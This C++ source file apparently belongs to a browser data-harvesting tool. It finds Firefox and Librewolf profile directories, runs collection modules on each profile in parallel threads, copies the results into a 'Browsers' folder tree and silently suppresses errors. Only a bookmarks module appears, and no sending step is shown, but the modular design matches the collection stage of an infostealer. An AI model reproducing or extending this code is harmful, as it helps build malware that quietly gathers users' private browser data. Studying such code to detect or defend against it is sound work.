//
// Created by .1qxz on 09.06.2024.
//

#include "FirefoxBrowsers.h"
#include "impl/FBookmarks.h"

static const std::vector<std::pair<std::string, fs::path>> FIREFOX_BROWSERS = {
        {"Firefox",  Utils::getRoamingPath() / "Mozilla" / "Firefox" / "Profiles"},
        {"Librewolf",  Utils::getRoamingPath() / "librewolf" / "Profiles"},
};


FirefoxBrowsers::FirefoxBrowsers() {
    this->modules.push_back(new FBookmarks());
}

void FirefoxBrowsers::execute(fs::path &root) {
    std::vector<std::thread> threads;

    for(const auto &browser : FIREFOX_BROWSERS)
    {
        if(!exists(browser.second))
            continue;

        threads.emplace_back([browser, &root, this]() {
            std::vector<std::thread> moduleThreads;

            fs::path browserRoot = root / "Browsers" / browser.first;

            std::vector<std::string> profiles = FirefoxBrowsers::findProfiles(browser.second);

            for(FirefoxBrowserModule* module : this->modules)
            {
                for(std::string &profile : profiles) {
                    try {
                        module->setProfile(profile);
                        module->execute(browserRoot, browser.first, browser.second);
                    } catch (const std::exception& e) {
                        #if DEV
                            std::cerr << "DEBUG ERROR: " << e.what() << std::endl;
                        #endif
                    } catch (...){}
                }
            }
        });
    }

    for(auto& thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
}

std::vector<std::string> FirefoxBrowsers::findProfiles(const fs::path &path) {
    std::vector<std::string> subdirs;

    if (fs::is_directory(path)) {
        for (const auto& entry : fs::directory_iterator(path)) {
            if (fs::is_directory(entry.path())) {
                subdirs.push_back(entry.path().filename().string());
            }
        }
    }

    return subdirs;
}
